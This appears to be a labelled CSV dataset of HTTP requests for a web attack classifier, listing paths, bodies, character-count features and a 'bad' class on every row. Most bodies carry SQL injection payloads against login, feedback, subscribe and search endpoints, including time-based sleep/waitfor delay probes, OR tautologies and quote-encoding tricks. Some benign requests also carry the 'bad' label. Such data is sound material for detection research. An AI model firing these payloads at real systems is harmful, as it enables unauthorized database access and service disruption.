method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/sendFeedback,submit=Submit&cfile=1%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,10,bad
GET,/index.jsp?content=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b580-580)%20--%20&name=ckwiadcj&subject=1,0,0,1,1,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b30-30-1=0%2b0%2b0%2b1%20or%20'ypraFpry'='&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b527-527)%20or%20'oOPOjXva'='&uid=1,4,0,0,1,4,1,bad
GET,/survey_questions.jsp?step=-1%20OR%202%2b417-417-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/search.jsp?query=DZnXqH0B');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c,0,0,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2%252527%252522&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/status_check.jsp,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'""&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=if(now()=sysdate()%2csleep(6)%2c0)&subject=1,0,0,0,4,0,1,bad
GET,/index.jsp?content=zd4spQve');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/doLogin,,0,0,0,0,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b940-940-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,0,4,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=1'""",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf""&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1'%20OR%202%2b832-832-1=0%2b0%2b0%2b1%20or%20'aAKZiHEc'=',4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=7pgTGTLe,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1%20OR%203%2b110-110-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/search.jsp?query=1,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2%252527%252522&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,bad
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1,0,0,0,0,0,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0''%f0""""&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=oBiLJOkK';select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=VNrlGXkq';%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b527-527-1=0%2b0%2b0%2b1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,4,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1""%20OR%202%2b641-641-1=0%2b0%2b0%2b1%20--%20&subject=1",0,1,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=if(now()=sysdate()%2csleep(6)%2c0)&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=if(now()=sysdate()%2csleep(3)%2c0),0,0,0,4,0,1,bad
POST,/doLogin,"btnSubmit=Login&passw=%f0''%f0""""&uid=1",2,2,0,0,0,1,bad
GET,/survey_questions.jsp?step=Fp7j3nKR';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b580-580-1=0%2b0%2b0%2b1%20--%20&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
GET,/search.jsp?query=-1%20OR%202%2b110-110-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=%bf'%bf""&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=1'""&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1);%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=rpT1R3rf';select%20pg_sleep(6);%20--%20,1,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=%bf'%bf""&uid=1",1,1,0,0,0,1,bad
GET,/search.jsp?query=-1;%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1""%20OR%202%2b964-964-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z",0,2,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=iwvl9mSh';%20waitfor%20delay%20'0:0:6'%20--%20&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
GET,/survey_questions.jsp?step=b%25'%20AND%202*3*8=6*8%20AND%20'MnHy'!='MnHy%25,,4,0,0,0,4,0,bad
GET,/subscribe.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5c&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI=&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b910-910)%20or%20'6N78EPpD'='&uid=1,4,0,0,1,4,1,bad
GET,/index.jsp?content=-1%20OR%202%2b774-774-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b350-350-1=0%2b0%2b0%2b1&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=WJqyQazT&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b376-376-1=0%2b0%2b0%2b1%20--%20&subject=1,0,0,1,0,4,0,bad
GET,/survey_questions.jsp?step=b'%20AND%202*3*8=6*8%20AND%20'vIBC'='vIBC,,4,0,0,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z&subject=1",0,2,0,5,0,1,bad
GET,/index.jsp?content=E86iPFjW,,0,0,0,0,0,0,bad
GET,/index.jsp?content=Tke1HiYa'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b18-18-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=sDlldLMi';%20waitfor%20delay%20'0:0:6'%20--%20,3,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%40%40LAgrU&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=JyI=&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=%bf'%bf""&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=0""XOR(if(now()=sysdate()%2csleep(10)%2c0))XOR""Z&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,2,0,5,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=lmSedIkd';select%20pg_sleep(9);%20--%20,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=BCC0EPDK';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=BNJqHggD');select%20pg_sleep(6);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=if(now()=sysdate()%2csleep(3)%2c0),0,0,0,4,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(6);%20--%20,0,0,1,1,3,3,bad
GET,/swagger,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,9,bad
GET,/search.jsp?query=-1;select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0''%f0""""&name=yqyvkaxo&subject=1",2,2,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI=,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
GET,/search.jsp?query=JyI=,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=%5c,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=iDRZ8biN'));select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'""%2b(select(0)from(select(sleep(9)))v)%2b""*/",2,2,0,15,0,9,bad
GET,/swagger/properties.json,,0,0,0,0,0,0,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'""",1,1,0,0,0,1,bad
GET,/survey_questions.jsp,,0,0,0,0,0,2,bad
POST,/sendFeedback,submit=Submit&cfile=NZvNTzGR'));select%20pg_sleep(10);%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=qSHSncdC&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=JyI=,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%40%40EqgWT,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%bf'%bf""",1,1,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=BVaAyU50'));select%20pg_sleep(3);%20--%20,1,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1""%20OR%202%2b717-717-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=RY0k269y'));select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
GET,/search.jsp?query=fes6MWtF'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b921-921-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,1,bad
GET,/search.jsp?query=%40%40QKG3k,,0,0,0,0,0,0,bad
GET,/search.jsp?query=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1%20OR%202%2b447-447-1=0%2b0%2b0%2b1,0,0,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20527=527%20AND%203%2b1-1-1=1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=0'XOR(if(now()=sysdate()%2csleep(7)%2c0))XOR'Z&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
GET,/retirement.htm,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
GET,/index.jsp?content=%5c,,0,0,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%f0''%f0""""",2,2,0,0,0,0,bad
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm'%20AND%202*3*8=6*8%20AND%20'eMPA'='eMPA,,4,0,0,0,4,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=-1""%20OR%202%2b751-751-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf'%bf""",1,1,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2>(0%2b5%2b580-580)%20--%20&name=ckwiadcj&subject=1,0,0,1,1,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1'%20OR%202%2b863-863-1=0%2b0%2b0%2b1%20--%20&subject=1,1,0,1,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=JyI=&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b350-350-1=0%2b0%2b0%2b1&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=1%00%c0%a7%c0%a2%252527%252522&uid=1,0,0,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=NGrVN4VM';select%20pg_sleep(6);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,2,0,0,5,0,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1));select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
GET,/survey_questions.jsp?step=if(now()=sysdate()%2csleep(3)%2c0),,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=if(now()=sysdate()%2csleep(9)%2c0),0,0,0,4,0,1,bad
GET,/index.jsp?content=rlMdnOi0';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=(select(0)from(select(sleep(10)))v)/*'%2b(select(0)from(select(sleep(10)))v)%2b'""%2b(select(0)from(select(sleep(10)))v)%2b""*/&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
GET,/search.jsp?query=if(now()=sysdate()%2csleep(6)%2c0),,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%25'%20AND%202*3*8=6*8%20AND%20't4v9'!='t4v9%25&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=xpBGuR7r'));select%20pg_sleep(9);%20--%20&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=arVzSnJi';%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,3,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=-1""%20OR%202%2b773-773-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,1,1,0,4,0,bad
